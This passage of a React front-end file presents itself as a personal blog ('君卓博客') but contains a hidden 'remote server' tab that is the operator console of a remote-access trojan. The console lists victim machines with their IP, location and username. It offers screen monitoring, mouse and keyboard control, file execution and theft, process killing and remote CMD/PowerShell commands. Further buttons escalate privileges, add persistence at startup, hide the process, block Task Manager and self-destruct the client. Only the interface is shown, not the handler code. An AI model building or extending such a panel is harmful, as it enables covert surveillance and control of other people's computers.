                className="btn" 
                onClick={handleRemoteServerLogout}
                style={{ background: '#e74c3c' }}
              >
                <i className="fas fa-lock"></i> 退出
              </button>
            </div>
          </div>

          <div style={{ display: 'grid', gridTemplateColumns: '1fr 2fr', gap: '2rem' }}>
            <div className="card client-list-card">
              <h3>
                <i className="fas fa-users"></i> 在线客户端 ({clients.filter(c => c.status === 'online').length}/{clients.length})
              </h3>
              <div className="client-list">
                {clients.map((client) => (
                  <div 
                    key={client.id}
                    className={`client-item ${client.status === 'online' ? 'online' : 'offline'} ${selectedClient?.id === client.id ? 'selected' : ''}`}
                  >
                    <div 
                      className="client-content"
                      onClick={() => {
                        setSelectedClient(client)
                        setScreenshotUrl('')
                        setScreenViewActive(false)
                        setDirectoryItems([])
                        setProcesses([])
                        setCommandResult('')
                      }}
                    >
                      <div className="client-status">
                        <span className={`status-dot ${client.status === 'online' ? 'online' : 'offline'}`}></span>
                        <span className="client-hostname">{client.hostname}</span>
                      </div>
                      <div className="client-info">
                        <span className="client-ip">{client.ip}</span>
                        <span className="client-location">{client.city}, {client.country}</span>
                      </div>
                      <div className="client-meta">
                        <span>{client.os}</span>
                        <span>{client.username}</span>
                      </div>
                    </div>
                    <button 
                      className="btn btn-sm danger delete-btn" 
                      onClick={(e) => {
                        e.stopPropagation()
                        handleRemoveClient(client.id, client.hostname)
                      }}
                      title="删除客户端"
                    >
                      <i className="fas fa-trash"></i>
                    </button>
                  </div>
                ))}
                {clients.length === 0 && (
                  <p style={{ textAlign: 'center', color: '#666', padding: '2rem' }}>暂无在线客户端</p>
                )}
              </div>
            </div>

            <div className="client-panel">
              {selectedClient ? (
                <div style={{ display: 'flex', flexDirection: 'column', gap: '2rem' }}>
                  <div className="card client-info-card">
                    <h3>
                      <i className="fas fa-info-circle"></i> 客户端信息
                    </h3>
                    <div className="info-grid">
                      <div className="info-item"><span className="label">ID:</span> {selectedClient.id}</div>
                      <div className="info-item"><span className="label">IP:</span> {selectedClient.ip}</div>
                      <div className="info-item"><span className="label">国家:</span> {selectedClient.country}</div>
                      <div className="info-item"><span className="label">城市:</span> {selectedClient.city}</div>
                      <div className="info-item"><span className="label">ISP:</span> {selectedClient.isp}</div>
                      <div className="info-item"><span className="label">主机名:</span> {selectedClient.hostname}</div>
                      <div className="info-item"><span className="label">操作系统:</span> {selectedClient.os}</div>
                      <div className="info-item"><span className="label">用户名:</span> {selectedClient.username}</div>
                      <div className="info-item"><span className="label">CPU:</span> {selectedClient.cpu}</div>
                      <div className="info-item"><span className="label">内存:</span> {selectedClient.ram}</div>
                    </div>
                  </div>

                  <div className="card screen-view-card">
                    <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '1rem' }}>
                      <h3>
                        <i className="fas fa-desktop"></i> 屏幕查看
                      </h3>
                      <div style={{ display: 'flex', gap: '0.5rem' }}>
                        {!screenViewActive ? (
                          <button 
                            className="btn" 
                            onClick={() => startScreenView(selectedClient.id)}
                            style={{ background: '#2ecc71' }}
                          >
                            <i className="fas fa-play"></i> 开始监控
                          </button>
                        ) : (
                          <button 
                            className="btn" 
                            onClick={stopScreenView}
                            style={{ background: '#e74c3c' }}
                          >
                            <i className="fas fa-stop"></i> 停止监控
                          </button>
                        )}
                      </div>
                    </div>
                    <div className="screen-container">
                      {screenshotUrl ? (
                        <img 
                          src={screenshotUrl} 
                          alt="客户端屏幕" 
                          className="screen-image"
                          onClick={(e) => {
                            const rect = e.currentTarget.getBoundingClientRect()
                            const x = ((e.clientX - rect.left) / rect.width) * 1920
                            const y = ((e.clientY - rect.top) / rect.height) * 1080
                            handleMouseControl(selectedClient.id, Math.round(x), Math.round(y), 'click')
                          }}
                        />
                      ) : (
                        <div className="screen-placeholder">
                          <i className="fas fa-desktop"></i>
                          <span>点击开始监控查看客户端屏幕</span>
                        </div>
                      )}
                    </div>
                    <div className="mouse-controls">
                      <button 
                        className="btn" 
                        onClick={() => handleMouseControl(selectedClient.id, 0, 0, 'move')}
                        style={{ background: '#95a5a6' }}
                      >
                        <i className="fas fa-mouse-pointer"></i> 移动鼠标到左上角
                      </button>
                      <button 
                        className="btn" 
                        onClick={() => handleKeyboardControl(selectedClient.id, 'enter', 'press')}
                        style={{ background: '#95a5a6' }}
                      >
                        <i className="fas fa-keyboard"></i> 按回车键
                      </button>
                    </div>
                  </div>

                  <div className="card directory-card">
                    <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '1rem' }}>
                      <h3>
                        <i className="fas fa-folder-open"></i> 文件浏览
                      </h3>
                      <div style={{ display: 'flex', gap: '0.5rem' }}>
                        {currentPath !== '.' && (
                          <button 
                            className="btn" 
                            onClick={() => navigateToParentDirectory()}
                            style={{ background: '#95a5a6' }}
                          >
                            <i className="fas fa-arrow-up"></i> 上一级
                          </button>
                        )}
                        <button 
                          className="btn" 
                          onClick={() => getClientDirectory(selectedClient.id)}
                          style={{ background: '#3498db' }}
                        >
                          <i className="fas fa-refresh"></i> 刷新
                        </button>
                      </div>
                    </div>
                    <div className="path-bar">
                      <span className="path-label">当前路径:</span>
                      <div className="path-links">
                        {renderPathBreadcrumbs()}
                      </div>
                    </div>
                    <div className="file-browser">
                      {directoryItems.map((item, index) => (
                        <div key={`${item.name}-${index}`} className="browser-item">
                          <i className={`fas ${item.type === 'directory' ? 'fa-folder text-orange' : 'fa-file text-blue'}`}></i>
                          <span className="item-name" onClick={() => item.type === 'directory' && getClientDirectory(selectedClient.id, item.path)}>{item.name}</span>
                          {item.size && <span className="item-size">{(item.size / 1024).toFixed(2)} KB</span>}
                          <div className="item-actions">
                            {item.type === 'directory' && (
                              <button 
                                className="btn btn-sm" 
                                onClick={() => getClientDirectory(selectedClient.id, item.path)}
                              >
                                <i className="fas fa-folder-open"></i> 进入
                              </button>
                            )}
                            {item.type === 'file' && (
                              <>
                                <button 
                                  className="btn btn-sm" 
                                  onClick={() => handleExecuteFile(selectedClient.id, item.path)}
                                >
                                  <i className="fas fa-play"></i> 执行
                                </button>
                                <button 
                                  className="btn btn-sm" 
                                  onClick={() => handleDownloadFile(selectedClient.id, item.path)}
                                >
                                  <i className="fas fa-download"></i> 下载
                                </button>
                                <button 
                                  className="btn btn-sm danger" 
                                  onClick={() => handleDeleteFile(selectedClient.id, item.path)}
                                >
                                  <i className="fas fa-trash"></i> 删除
                                </button>
                              </>
                            )}
                          </div>
                        </div>
                      ))}
                      {directoryItems.length === 0 && (
                        <p style={{ textAlign: 'center', color: '#666', padding: '1rem' }}>点击刷新查看目录</p>
                      )}
                    </div>
                  </div>

                  <div className="card processes-card">
                    <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '1rem' }}>
                      <h3>
                        <i className="fas fa-cog"></i> 进程管理
                      </h3>
                      <button 
                        className="btn" 
                        onClick={() => getClientProcesses(selectedClient.id)}
                        style={{ background: '#3498db' }}
                      >
                        <i className="fas fa-refresh"></i> 刷新进程
                      </button>
                    </div>
                    <div className="process-list">
                      {processes.map((proc) => (
                        <div key={proc.pid} className="process-item">
                          <div className="process-info">
                            <span className="process-name">{proc.name}</span>
                            <span className="process-pid">PID: {proc.pid}</span>
                            <span className="process-user">{proc.username}</span>
                          </div>
                          <button 
                            className="btn btn-sm danger" 
                            onClick={() => killClientProcess(selectedClient.id, proc.pid)}
                          >
                            <i className="fas fa-times"></i> 结束
                          </button>
                        </div>
                      ))}
                      {processes.length === 0 && (
                        <p style={{ textAlign: 'center', color: '#666', padding: '1rem' }}>点击刷新查看进程</p>
                      )}
                    </div>
                  </div>

                  <div className="card command-card">
                    <h3>
                      <i className="fas fa-terminal"></i> 命令执行
                    </h3>
                    <div className="command-input-group">
                      <select 
                        value={commandType}
                        onChange={(e) => setCommandType(e.target.value)}
                        className="command-select"
                      >
                        <option value="cmd">CMD</option>
                        <option value="powershell">PowerShell</option>
                      </select>
                      <input
                        type="text"
                        value={remoteCommand}
                        onChange={(e) => setRemoteCommand(e.target.value)}
                        placeholder="输入命令..."
                        className="command-input"
                        onKeyPress={(e) => e.key === 'Enter' && handleRemoteCmd()}
                      />
                      <button 
                        className="btn" 
                        onClick={handleRemoteCmd}
                        style={{ background: '#9b59b6' }}
                      >
                        <i className="fas fa-play"></i> 执行
                      </button>
                    </div>
                    {commandResult && (
                      <div className="command-output">
                        <pre>{commandResult}</pre>
                      </div>
                    )}
                  </div>

                  <div className="card actions-card">
                    <h3>
                      <i className="fas fa-tools"></i> 高级操作
                    </h3>
                    <div className="action-buttons">
                      <button 
                        className="btn action-btn" 
                        onClick={() => handleElevate(selectedClient.id)}
                        style={{ background: '#f39c12' }}
                      >
                        <i className="fas fa-shield-alt"></i> 提权至管理员
                      </button>
                      <button 
                        className="btn action-btn" 
                        onClick={() => handleAddStartup(selectedClient.id)}
                        style={{ background: '#2ecc71' }}
                      >
                        <i className="fas fa-power-off"></i> 添加到开机启动
                      </button>
                      <button 
                        className="btn action-btn" 
                        onClick={() => handleHideProcess(selectedClient.id)}
                        style={{ background: '#9b59b6' }}
                      >
                        <i className="fas fa-eye-slash"></i> 隐藏进程
                      </button>
                      <button 
                        className="btn action-btn" 
                        onClick={() => handleBlockTaskMgr(selectedClient.id)}
                        style={{ background: '#e74c3c' }}
                      >
                        <i className="fas fa-ban"></i> 禁止任务管理器
                      </button>
                      <button 
                        className="btn action-btn danger" 
                        onClick={() => handleSelfDestruct(selectedClient.id)}
                        style={{ background: '#c0392b' }}
                      >
                        <i className="fas fa-bomb"></i> 自毁客户端
                      </button>
                    </div>
                  </div>
                </div>
              ) : (
                <div className="card empty-state">
                  <i className="fas fa-computer"></i>
                  <h3>选择一个客户端</h3>
                  <p>从左侧列表中选择一个在线客户端以查看和控制</p>
                </div>
              )}
            </div>
          </div>
        </div>
      )}
    </div>
  )

  return (
    <div className="container">
      <header>
        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', flexWrap: 'wrap', gap: '1rem' }}>
          <div>
            <h1>君卓博客</h1>
            <p>Junzhuo Blog</p>
          </div>
          {isAdmin ? (
            <button className="btn btn-logout" onClick={handleLogout} style={{ background: '#e74c3c' }}>
              <i className="fas fa-sign-out-alt"></i> 退出管理员
            </button>
          ) : (
            <button className="btn btn-login" onClick={() => setShowLoginModal(true)} style={{ background: '#9b59b6' }}>
              <i className="fas fa-user-shield"></i> 登录管理员
            </button>
          )}
        </div>
        
        <nav className="main-nav">
          <button 
            className={`nav-btn ${activeTab === 'home' ? 'active' : ''}`}
            onClick={() => setActiveTab('home')}
          >
            <i className="fas fa-home"></i> 首页
          </button>
          <button 
            className={`nav-btn ${activeTab === 'fileServer' ? 'active' : ''}`}
            onClick={() => setActiveTab('fileServer')}
          >
            <i className="fas fa-cloud-upload-alt"></i> 文件上传下载服务器
          </button>
          <button 
            className={`nav-btn ${activeTab === 'remoteServer' ? 'active' : ''}`}
            onClick={() => setActiveTab('remoteServer')}
          >
            <i className="fas fa-server"></i> 远程服务端
          </button>
        </nav>
      </header>

      <div className="tab-content">
        {activeTab === 'home' && renderHomeTab()}
        {activeTab === 'fileServer' && renderFileServerTab()}
        {activeTab === 'remoteServer' && renderRemoteServerTab()}
      </div>

      {showLoginModal && (
        <div style={{ 
          position: 'fixed', 
          top: 0, 
          left: 0, 
          right: 0, 
          bottom: 0, 
          background: 'rgba(0,0,0,0.5)', 
          display: 'flex', 
          alignItems: 'center', 
          justifyContent: 'center',
          zIndex: 1000 
        }}>
          <div style={{ 
            background: 'white', 
            padding: '2rem', 
            borderRadius: '12px', 
            width: '90%', 
            maxWidth: '400px' 
          }}>
            <h2 style={{ marginBottom: '1.5rem', color: '#2c3e50' }}>
              <i className="fas fa-user-shield"></i> 管理员登录
            </h2>
            <div style={{ marginBottom: '1rem' }}>
              <label style={{ display: 'block', marginBottom: '0.5rem', color: '#333' }}>用户名</label>
              <input
                type="text"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                placeholder="用户名"
                style={{ width: '100%', padding: '0.8rem', borderRadius: '6px', border: '1px solid #ddd' }}
              />
            </div>
            <div style={{ marginBottom: '1.5rem' }}>
              <label style={{ display: 'block', marginBottom: '0.5rem', color: '#333' }}>密码</label>
              <input
                type="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder="密码"
                style={{ width: '100%', padding: '0.8rem', borderRadius: '6px', border: '1px solid #ddd' }}
              />
            </div>
            <div style={{ display: 'flex', gap: '1rem' }}>
              <button 
                className="btn" 
                onClick={() => { setShowLoginModal(false); setUsername(''); setPassword('') }}
                style={{ flex: 1, background: '#666' }}
              >
                取消
              </button>
              <button 
                className="btn btn-upload" 
                onClick={handleLogin}
                style={{ flex: 1 }}
              >
                登录
              </button>
            </div>
          </div>
        </div>
      )}

      {showCmdModal && (
        <div style={{ 
          position: 'fixed', 
          top: 0, 
          left: 0, 
          right: 0, 
          bottom: 0, 
          background: 'rgba(0,0,0,0.5)', 
          display: 'flex', 
          alignItems: 'center', 
          justifyContent: 'center',
          zIndex: 1000 
        }}>
          <div style={{ 
            background: 'white', 
            padding: '2rem', 
            borderRadius: '12px', 
            width: '90%', 
            maxWidth: '600px' 
          }}>
            <h2 style={{ marginBottom: '1.5rem', color: '#2c3e50' }}>
              <i className="fas fa-terminal"></i> 命令执行
            </h2>
            {currentDir && (
              <div style={{ 
                background: '#f8f9fa', 
                padding: '0.5rem 1rem', 
                borderRadius: '6px', 
                marginBottom: '1rem',
                fontFamily: 'monospace',
                color: '#333'
              }}>
                <span style={{ color: '#666' }}>当前目录:</span> {currentDir}
              </div>
            )}
            <div style={{ display: 'flex', gap: '1rem', marginBottom: '1rem' }}>
              <input
                type="text"
                value={command}
                onChange={(e) => setCommand(e.target.value)}
                placeholder="输入命令，如: dir, ipconfig"
                style={{ flex: 1, padding: '0.8rem', borderRadius: '6px', border: '1px solid #ddd' }}
              />
              <button className="btn" onClick={handleExecuteCommand} style={{ background: '#9b59b6' }}>
                <i className="fas fa-play"></i> 执行
              </button>
            </div>
            {cmdResult && (
              <div style={{ 
                background: '#1a1a2e', 
                color: '#00ff00', 
                padding: '1rem', 
                borderRadius: '6px', 
                fontFamily: 'monospace',
                maxHeight: '300px',
                overflowY: 'auto'
              }}>
                <pre>{cmdResult}</pre>
              </div>
            )}
            <div style={{ display: 'flex', gap: '1rem', marginTop: '1rem' }}>
              <button 
                className="btn" 
                onClick={() => { setShowCmdModal(false); setCommand(''); setCmdResult('') }}
                style={{ flex: 1, background: '#666' }}
              >
                关闭
              </button>
            </div>
          </div>
        </div>
      )}

      {showCreateModal && (
        <div style={{ 
          position: 'fixed', 
          top: 0, 
          left: 0, 
          right: 0, 
          bottom: 0, 
          background: 'rgba(0,0,0,0.5)', 
          display: 'flex', 
          alignItems: 'center', 
          justifyContent: 'center',
          zIndex: 1000 
        }}>
          <div style={{ 
            background: 'white', 
            padding: '2rem', 
            borderRadius: '12px', 
            width: '90%', 
            maxWidth: '400px' 
          }}>
            <h2 style={{ marginBottom: '1.5rem', color: '#2c3e50' }}>
              <i className={`fas ${showCreateModal === 'file' ? 'fa-file-plus' : 'fa-folder-plus'}`}></i> 
              新建{showCreateModal === 'file' ? '文件' : '目录'}
            </h2>
            <div style={{ marginBottom: '1.5rem' }}>
              <label style={{ display: 'block', marginBottom: '0.5rem', color: '#333' }}>名称</label>
              <input
                type="text"
                value={newItemName}
                onChange={(e) => setNewItemName(e.target.value)}
                placeholder={`请输入${showCreateModal === 'file' ? '文件' : '目录'}名称`}
                style={{ width: '100%', padding: '0.8rem', borderRadius: '6px', border: '1px solid #ddd' }}
                autoFocus
              />
            </div>
            <div style={{ display: 'flex', gap: '1rem' }}>
              <button 
                className="btn" 
                onClick={() => { setShowCreateModal(null); setNewItemName('') }}
                style={{ flex: 1, background: '#666' }}
              >
                取消
              </button>
              <button 
                className="btn btn-upload" 
                onClick={createNewItem}
                style={{ flex: 1 }}
              >
                创建
              </button>
            </div>
          </div>
        </div>
      )}

      {showFileEditor && (
        <div style={{ 
          position: 'fixed', 
          top: 0, 
          left: 0, 
          right: 0, 
          bottom: 0, 
          background: 'rgba(0,0,0,0.5)', 
          display: 'flex', 
          alignItems: 'center', 
          justifyContent: 'center',
          zIndex: 1000 
        }}>
          <div style={{ 
            background: 'white', 
            padding: '2rem', 
            borderRadius: '12px', 
            width: '90%', 
            maxWidth: '800px',
            maxHeight: '80vh'
          }}>
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '1.5rem' }}>
              <h2 style={{ color: '#2c3e50' }}>
                <i className="fas fa-file-edit"></i> 编辑文件
              </h2>
              <span style={{ color: '#666', fontSize: '0.9rem', fontFamily: 'monospace' }}>{editingFile}</span>
            </div>
            <textarea
              value={editingContent}
              onChange={(e) => setEditingContent(e.target.value)}
              style={{ 
                width: '100%', 
                height: '300px', 
                padding: '1rem', 
                borderRadius: '6px', 
                border: '1px solid #ddd',
                fontFamily: 'monospace',
                fontSize: '0.9rem',
                resize: 'vertical'
              }}
              placeholder="文件内容..."
            />
            <div style={{ display: 'flex', gap: '1rem', marginTop: '1rem' }}>
              <button 
                className="btn" 
                onClick={() => { setShowFileEditor(false); setEditingFile(''); setEditingContent('') }}
                style={{ flex: 1, background: '#666' }}
              >
                取消
              </button>
              <button 
                className="btn btn-upload" 
                onClick={saveFile}
                style={{ flex: 1 }}
              >
                保存
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  )
}